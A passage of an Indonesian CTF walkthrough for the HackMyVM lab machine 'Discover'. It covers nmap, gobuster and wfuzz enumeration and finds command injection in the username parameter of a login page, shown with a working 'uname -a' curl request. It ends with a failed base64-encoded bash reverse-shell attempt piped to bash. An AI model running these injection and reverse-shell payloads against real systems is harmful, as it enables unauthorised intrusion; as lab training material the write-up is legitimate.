| zBDhL5/XtPXES+Y99XjXPheiJn/lv9r1wEoJqwhYOgrDZC9jzPP1c879kG9cKso8
| 9YKUdKZsIQ4Vn/y8qFm/19o/fvl+WiG1lOmqL++1yenDAgMBAAGjITAfMB0GA1Ud
| DgQWBBRwGYN8tv57bJNlgoWzTFGbnh0USjANBgkqhkiG9w0BAQsFAAOCAQEAswUf
| 0tmSulCmt9JobZuI7Mp2ttmicRHcmLW7VEBD92GvQbopEAzd3G4+Y+J7mgNXQn4l
| wOEMduGoztZUrtRt/0SmHr99mmGO3qNpyGRF/il8iPBOwrBeYREgzPds2T04NCe/
| 6n100EmCyXw0SXBMzQW4CFN6k+w/+mGL9bsG4d8+1wfZGssCKzSwFYUUN9BqDc3I
| EKEp2/NyvaZYH5FTP/HnmkdEanCeIuGNxGK9hoYHC2H38cbUGdJxDZJybNCFZ6le
| w5iCZRknr73qCQHiMLn3AMT+C2tkmK1EnKC/L4phikiCHN+w5Gn/s0PXqmHtkTqQ
| 0BLjvy992do5GE6ISQ==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
8686/tcp open  java-rmi             syn-ack Java RMI
| rmi-dumpregistry: 
|   debian/7676/jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:34231
|     extends
|       java.rmi.server.RemoteStub
|       extends
|         java.rmi.server.RemoteObject
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:8686
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4848-TCP:V=7.92%I=7%D=9/9%Time=631AC29C%P=x86_64-pc-linux-gnu%r(Get
SF:Request,1851,"HTTP/1\.1\x20202\x20Accepted\r\nServer:\x20Eclipse\x20Gla
SF:ssFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\
SF:(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nContent
SF:-Type:\x20text/html;charset=UTF-8\r\nConnection:\x20close\r\nContent-Le
SF:ngth:\x206008\r\n\r\n&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XH
SF:TML\x201\.0\x20Strict//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtm
SF:l1-strict\.dtd\"&gt;\n&lt;html\x20xmlns=\"http://www\.w3\.org/1999/xhtml\"\x2
SF:0xml:lang=\"en\"\x20lang=\"en\"&gt;\n&lt;head&gt;\n&lt;!--\n\n\x20\x20\x20\x20Copyr
SF:ight\x20\(c\)\x202010,\x202018\x20Oracle\x20and/or\x20its\x20affiliates
SF:\.\x20All\x20rights\x20reserved\.\n\n\x20\x20\x20\x20This\x20program\x2
SF:0and\x20the\x20accompanying\x20materials\x20are\x20made\x20available\x2
SF:0under\x20the\n\x20\x20\x20\x20terms\x20of\x20the\x20Eclipse\x20Public\
SF:x20License\x20v\.\x202\.0,\x20which\x20is\x20available\x20at\n\x20\x20\
SF:x20\x20http://www\.eclipse\.org/legal/epl-2\.0\.\n\n\x20\x20\x20\x20Thi
SF:s\x20Source\x20Code\x20may\x20also\x20be\x20made\x20available\x20under\
SF:x20the\x20following\x20Secondary\n\x20\x20\x20\x20Licenses\x20when\x20t
SF:he\x20conditions\x20for\x20such\x20availability\x20set\x20forth\x20in\x
SF:20the\n\x20\x20\x20\x20Eclipse\x20Public\x20License\x20v\.\x202\.0\x20a
SF:re\x20satisfied:\x20GNU\x20General\x20Public\x20Lic")%r(HTTPOptions,E9,
SF:"HTTP/1\.1\x20405\x20OPTIONS\x20method\x20is\x20not\x20allowed\r\nServe
SF:r:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servl
SF:et/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/De
SF:bian/11\)\r\nAllow:\x20GET,\x20POST,\x20HEAD,\x20DELETE,\x20PUT\r\nConn
SF:ection:\x20close\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,E6,"HT
SF:TP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nServer:\x20Ecl
SF:ipse\x20GlassFish\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x
SF:20JSP/3\.0\(Eclipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)
SF:\r\nDate:\x20Fri,\x2009\x20Sep\x202022\x2004:35:31\x20GMT\r\nConnection
SF::\x20close\r\nContent-Length:\x200\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.92%I=7%D=9/9%Time=631AC296%P=x86_64-pc-linux-gnu%r(Get
SF:Request,F3E,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Eclipse\x20GlassFish\
SF:x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Eclips
SF:e\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nDate:\x20Fri,\
SF:x2009\x20Sep\x202022\x2004:35:25\x20GMT\r\nContent-Type:\x20text/html\r
SF:\nConnection:\x20close\r\nContent-Length:\x203668\r\n\r\n&lt;!DOCTYPE\x20H
SF:TML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01\x20Transitional//EN\"&gt;\
SF:n&lt;html\x20lang=\"en\"&gt;\n&lt;!--\n\n\tCopyright\x20\(c\)\x202010,\x202018\x
SF:20Oracle\x20and/or\x20its\x20affiliates\.\x20All\x20rights\x20reserved\
SF:.\n\tCopyright\x20\(c\)\x202020\x20Contributors\x20to\x20the\x20Eclipse
SF:\x20Foundation\.\n\t\n\x20\x20\x20\x20This\x20program\x20and\x20the\x20
SF:accompanying\x20materials\x20are\x20made\x20available\x20under\x20the\n
SF:\x20\x20\x20\x20terms\x20of\x20the\x20Eclipse\x20Public\x20License\x20v
SF:\.\x202\.0,\x20which\x20is\x20available\x20at\n\x20\x20\x20\x20http://w
SF:ww\.eclipse\.org/legal/epl-2\.0\.\n\n\x20\x20\x20\x20This\x20Source\x20
SF:Code\x20may\x20also\x20be\x20made\x20available\x20under\x20the\x20follo
SF:wing\x20Secondary\n\x20\x20\x20\x20Licenses\x20when\x20the\x20condition
SF:s\x20for\x20such\x20availability\x20set\x20forth\x20in\x20the\n\x20\x20
SF:\x20\x20Eclipse\x20Public\x20License\x20v\.\x202\.0\x20are\x20satisfied
SF::\x20GNU\x20General\x20Public\x20License,\n\x20\x20\x20\x20version\x202
SF:\x20with\x20the\x20")%r(HTTPOptions,C5,"HTTP/1\.1\x20405\x20Method\x20N
SF:ot\x20Allowed\r\nServer:\x20Eclipse\x20GlassFish\x20\x206\.1\.0\x20\r\n
SF:X-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Eclipse\x20GlassFish\x20\x20
SF:6\.1\.0\x20\x20Java/Debian/11\)\r\nAllow:\x20GET\r\nConnection:\x20clos
SF:e\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,E6,"HTTP/1\.1\x20505\
SF:x20HTTP\x20Version\x20Not\x20Supported\r\nServer:\x20Eclipse\x20GlassFi
SF:sh\x20\x206\.1\.0\x20\r\nX-Powered-By:\x20Servlet/5\.0\x20JSP/3\.0\(Ecl
SF:ipse\x20GlassFish\x20\x206\.1\.0\x20\x20Java/Debian/11\)\r\nDate:\x20Fr
SF:i,\x2009\x20Sep\x202022\x2004:35:25\x20GMT\r\nConnection:\x20close\r\nC
SF:ontent-Length:\x200\r\n\r\n");
Service Info: Host: discover.hmv

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:38
Completed NSE at 11:38, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.55 seconds

</span></code></pre></div></div>
<p>banyak sekali open port yang sudah diperoleh oleh nmap.</p>
<ul>
  <li>80 - HTTP, Apache httpd 2.4.54</li>
  <li>3700 - TCP, COBRA naming service (saya tidak terlalu tau pasti ini apa)</li>
  <li>4848 - appserv-http?, semacam service untuk mengadministrasi web (maybe?)</li>
  <li>7676 - java-message-service</li>
  <li>8080 - Eclipse Glassfish 6.1.0</li>
</ul>

<p>karena pada output nmap di atas menunjukkan <em>url redirect</em>, dan biasanya saya sebelum pertikaian dimulai saya sudah mencoba testing pada <em>IP Host</em> apakah ada redireksi ke <em>custom domain</em> atau tidak. ternyata hasilnya</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ curl <span class="nt">-I</span> 192.168.56.8
HTTP/1.1 302 Found
Date: Fri, 09 Sep 2022 12:23:25 GMT
Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
Location: http://discover.hmv/
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

</code></pre></div></div>
<p>karena file <em>hosts</em> yang saya punya sudah saya buat <em>writable</em> maka saya sudah menyederhanakan diri saya sendiri untuk menambahkan apapun jenis <em>custom domain</em> kalau nanti-nanti saya memainkan permainan CTF atau membuat suatu <em>custom redirection</em> pada <em>public DNS</em>.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ <span class="nb">echo</span> <span class="s2">"192.168.56.8"</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<h3 id="3700---tcp-cobra-naming-service">3700 - TCP, Cobra naming service</h3>

<p><img src="https://i.ibb.co/mRxcg9C/image.png" alt="image" /></p>

<p><img src="https://i.ibb.co/2smmCt5/image.png" alt="image2" /></p>

<p>hmm, tidak ada hal yang menarik untuk ditelaah jadi saya mencoba memeriksa port yang lain lagi.</p>

<h3 id="4848---appserv-http">4848 - appserv-http?</h3>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ curl <span class="nt">-sI</span> discover.hmv:4848
HTTP/1.1 302 Found
Location: https://discover.hmv:4848/
Content-Length: 0
Date: Fri, 09 Sep 2022 12:27:51 GMT

</code></pre></div></div>
<p>HTTP status menunjukkan 302, itu berarti masih bisa diakses tapi karena sifatnya <em>Moved Temporarily</em> berarti ini sudah menampakkan kesan bahwa ada kemungkinan munculnya redireksi, jadi saya cek apakah ada tampilah webnya atau tidak.</p>

<p><img src="https://i.ibb.co/XFZgPnB/image.png" alt="loginpage" /></p>

<p>disini malah menampilkan, login page. sudah saya coba googling untuk mendapatkan <em>default credentials</em> tetap saja sama tidak ada yang bisa. karena ini based on <em>Java</em> tidak ada kemungkinan yang bisa dicapai dengan SQLi ataupun metode lain.</p>

<h3 id="7676---java-message-service-301">7676 - Java Message Service 301</h3>

<p>sama seperti yang pertama, tidak ada tampilan yang ditunjukkan.</p>

<h3 id="8080---eclipse-glassfish-610">8080 - Eclipse Glassfish 6.1.0</h3>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ curl <span class="nt">-I</span> http://discover.hmv:8080                                                                                          1 â†µ
HTTP/1.1 200 OK
Server: Eclipse GlassFish  6.1.0 
X-Powered-By: Servlet/5.0 JSP/3.0<span class="o">(</span>Eclipse GlassFish  6.1.0  Java/Debian/11<span class="o">)</span>
Accept-Ranges: bytes
ETag: W/<span class="s2">"3668-1662713904312"</span>
Last-Modified: Fri, 09 Sep 2022 08:58:24 GMT
Content-Length: 3668
Content-Type: text/html
</code></pre></div></div>
<p><img src="https://i.ibb.co/VBkHWwb/image.png" alt="server-running" /></p>

<p>pada gambar diatas, server sudah berjalan dengan baik dan letak administrasi ditujukan pada port 4848. jadi, saya berniat untuk mengeceknya nanti.</p>

<h3 id="80---http-apache">80 - HTTP Apache</h3>

<p>ini adalah tampilan website secara keseluruhan.</p>

<p><img src="https://i.ibb.co/x61Zk9h/screencapture-discover-hmv-2022-09-09-19-43-23.png" alt="gambar" /></p>

<p>terlihat seperti website biasa dan mungkin terlihat sedikit template haha, dan di atas ada tombol login pada bagian navbar, mungkin saya bisa memasukkan metode-metode injeksi pada laman ini nantinya.</p>

<p>Tapi saya mencoba untuk mem-bruteforce website secara keseluruhan agar saya tau struktur websitenya.</p>

<h2 id="bruteforcing-directory">bruteforcing directory</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ <span class="nb">cat </span>scan_gobuster               
/contact.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1363]
/aboutus.jpg          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 507077]
/aboutus.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17734]
/home.php             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 29575]
/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/assets/]
/img                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/img/]
/admin.jpg            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6965]
/css                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 310] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/css/]
/courses.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 19066]
/review.php           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1277]
/courses              <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 314] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/courses/]
/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 313] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/manual/]
/js                   <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 309] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/js/]
/statistics.php       <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 1339]
/logout.php           <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 22] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> home.php]
/myaccount.php        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 6302]
/payment.php          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1351]
/fonts                <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 312] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/fonts/]
/forgotpassword.php   <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1063]
/forgotpassword.html  <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8647]
/wall.jpg             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 1540495]
/wall.png             <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 698653]
/contactform          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://discover.hmv/contactform/]
/back1.jpg            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 144583]
/chat1.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2604]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]
/chat2.php            <span class="o">(</span>Status: 500<span class="o">)</span> <span class="o">[</span>Size: 2287]
/aboutus2.jpg         <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 459074]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 277]

</code></pre></div></div>
<p>well, saya tidak melihat adanya <em>login page</em> pada output gobuster di atas jadi saya bergerak ke burp suite untuk meng-<em>intercept</em> cara bekerja web yang sedang saya hadapi.</p>

<h2 id="burp-suite-intercepting">burp suite intercepting</h2>

<p><img src="https://i.ibb.co/0DkLDJv/image.png" alt="image" /></p>

<p>well, file <em>php</em> yang sangat tidak wajar, pikir saya. tanpa banyak basa basi saya langsung googling siapa tau bisa mendapatkan source-source di internet atau semacamnya.</p>

<p>dan ternyata, saya menemukannya di <a href="https://github.com/kirubashetty/edutor">repository github</a>.<br />
saat saya mencoba keliling sebentar pada repo tersebut dan saya berfikir bahwa tidak ada yang menarik.</p>

<h2 id="fuzzing-a-subdomain">fuzzing a subdomain</h2>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ <span class="nb">cat </span>scan.wfuzz 
<span class="k">********************************************************</span>
<span class="k">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         <span class="k">*</span>
<span class="k">********************************************************</span>

Target: http://discover.hmv/
Total requests: 114441

<span class="o">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                          
<span class="o">=====================================================================</span>

000000541:   200        22 L     51 W       822 Ch      <span class="s2">"log"</span> 
</code></pre></div></div>
<p>terlihat juga pada hasil wfuzz ada satu subdomain yang tercantum, jadi seperti biasa saya nge-save output ini pada file <em>hosts</em>.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ <span class="nb">echo</span> <span class="s2">"192.168.56.8 log.discover.hmv"</span> <span class="o">&gt;&gt;</span> /etc/hosts 
</code></pre></div></div>

<h2 id="bruteforcing-subdomain-directory">bruteforcing subdomain directory</h2>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ <span class="nb">cat </span>scan_gobuster.2                                                                                                     130 â†µ
/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 822]
/manual               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 321] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://log.discover.hmv/manual/]
/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 281]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 281]

</code></pre></div></div>
<p>hanya ada satu file yang bisa saya percayai, yaitu <em>index.php</em>. selain itu saya tidak yakin apakah bisa membantu saya kedepannya :)</p>

<h2 id="shell-as-www-data">shell as www-data</h2>

<p><img src="https://i.ibb.co/1zTTR3b/screencapture-log-discover-hmv-index-php-2022-09-09-20-08-21.png" alt="file" /></p>

<p>beginilah tampilannya, saya melihat pada tombol <em>submit</em> seperti dibuat sengaja untuk <em>disable</em> lalu saat saya cek sourcenya</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ curl <span class="nt">-v</span> log.discover.hmv        
<span class="k">*</span>   Trying 192.168.56.8:80...
<span class="k">*</span> Connected to log.discover.hmv <span class="o">(</span>192.168.56.8<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET / HTTP/1.1
<span class="o">&gt;</span> Host: log.discover.hmv
<span class="o">&gt;</span> User-Agent: curl/7.85.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> 
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 200 OK
&lt; Date: Fri, 09 Sep 2022 13:10:14 GMT
&lt; Server: Apache/2.4.54 <span class="o">(</span>Debian<span class="o">)</span>
&lt; Vary: Accept-Encoding
&lt; Content-Length: 822
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
&lt; 
&lt;html&gt;
  &lt;<span class="nb">head</span><span class="o">&gt;</span>
    &lt;title&gt;Discover login&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px"</span><span class="o">&gt;</span>
    &lt;/div&gt;
    &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#c9c9c9;padding:20px;"</span><span class="o">&gt;</span>
      &lt;h1 <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Login as Discover&lt;/h1&gt;
    &lt;form <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nv">action</span><span class="o">=</span><span class="s2">"index.php"</span> <span class="nv">method</span><span class="o">=</span><span class="s2">"</span><span class="nv">$_GET</span><span class="s2">"</span><span class="o">&gt;</span>
      &lt;label <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>Username:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"text"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"username"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Discover"</span><span class="o">&gt;</span>&lt;br&gt;
      &lt;label&gt;Password:&lt;/label&gt;&lt;br&gt;
      &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">name</span><span class="o">=</span><span class="s2">"password"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>&lt;br&gt;
    &lt;input <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"submit"</span> <span class="nv">disabled</span><span class="o">=</span><span class="s2">"disabled"</span> <span class="nv">value</span><span class="o">=</span><span class="s2">"Submit"</span><span class="o">&gt;</span>

    &lt;/form&gt;
  &lt;/div&gt;
  &lt;div <span class="nv">style</span><span class="o">=</span><span class="s2">"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px"</span> <span class="nv">align</span><span class="o">=</span><span class="s2">"center"</span><span class="o">&gt;</span>
      &lt;/div&gt;
  &lt;/body&gt;
&lt;/html&gt;
<span class="k">*</span> Connection <span class="c">#0 to host log.discover.hmv left intact</span>
</code></pre></div></div>
<p>pada <em>tag</em> form terdapat satu atribut method menggunakan <em>GET request</em> jadi sudah pasti bisa diprediksi bahwa tidak ada <em>POST request</em> yang bisa ditelusuri lagi karena query tidak bisa diredireksi dan diproses lebih lanjut pada status backend dari web ini. waw, lalu saya pun mencoba <em>LFI</em> dan <em>directory traversal</em> tapi tetap tidak bisa, sebelumnya <em>disable method</em>nya saya hapus agar saya bisa melihat seperti apa <em>GET request</em> bekerja.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
</code></pre></div></div>
<p><em>output query</em> yang dihasilkan dari request.</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">:</span><span class="c1">//log.discover.hmv/index.php?username=Discover&amp;password=aaaaaaaaaaa</span>

</code></pre></div></div>
<p>tidak ada hasil yang pasti, error message atau semacamnya. memang tampak aneh dan sangat wajar dalam dunia CTF apalagi machine pada difficulty medium.
<em>SSTI</em> sudah saya coba tapi tetap tidak bisa, ya iyalah orang beda franework yang dipakai. lalu saat saya mencoba untuk ngetest command injection dengan command <em>uname -a</em> dengan <em>curl</em> hasilnya akan saya letakkan di bawah ini.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via [machines/discover]
â•°â”€î˜‚ curl -s 'http://log.discover.hmv/index.php?username=uname+-a<span class="err">&amp;</span>password=aaaaaaaaaaa'
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;title&gt;</span>Discover login<span class="nt">&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color:#afafaf;padding:15px;border-radius:20px 20px 0px 0px"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color:#c9c9c9;padding:20px;"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h1</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>Login as Discover<span class="nt">&lt;/h1&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">action=</span><span class="s">"index.php"</span> <span class="na">method=</span><span class="s">"$_GET"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;label</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>Username:<span class="nt">&lt;/label&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span> <span class="na">value=</span><span class="s">"Discover"</span><span class="nt">&gt;&lt;br&gt;</span>
      <span class="nt">&lt;label&gt;</span>Password:<span class="nt">&lt;/label&gt;&lt;br&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"password"</span> <span class="na">name=</span><span class="s">"password"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;&lt;br&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">align=</span><span class="s">"center"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">disabled=</span><span class="s">"disabled"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;/form&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">style=</span><span class="s">"background-color:#ecf2d0;padding:20px;border-radius:0px 0px 20px 20px"</span> <span class="na">align=</span><span class="s">"center"</span><span class="nt">&gt;</span>
    Linux debian 5.10.0-17-amd64 #1 SMP Debian 5.10.136-1 (2022-08-13) x86_64 GNU/Linux
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>
<p>langsung gercep untuk pasang <em>reverse shell</em> eh ternyata-ternyata~ gagal. payload yang saya masukkan</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"7dOy1%2BT7Hq%2B%2BuiKqhWX4zCvVd8C7LBO%2B"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash
</code></pre></div></div>
<p>itu adalah basic rev shell yang berbasis <em>bash</em> dan saya <em>encode</em> menggunakan <em>base64</em>. tetap tidak bisa. lalu saya coba untuk di<em>encode</em> ke <em>URL</em> tetap tidak bisa juga.</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>â•­â”€ via <span class="o">[</span>machines/discover]
â•°â”€î˜‚ python <span class="nt">-c</span> <span class="s1">'import urllib.parse; string = "echo \"7dOy1%2BT7Hq%2B%2BuiKqhWX4zCvVd8C7LBO%2B\" | base64 -d | bash "; print(urllib.parse.quote_plus(string))'</span>
<span class="nb">echo</span>+%227dOy1%252BT7Hq%252B%252BuiKqhWX4zCvVd8C7LBO%252B%22+%7C+base64+-d+%7C+bash

</code></pre></div></div>
<p>lalu saya ganti dalam bentuk script yang dioutputkan ke <em>/tmp</em> tetap sama saja ketika saya eksekusi tidak membuahkan hasil.</p>

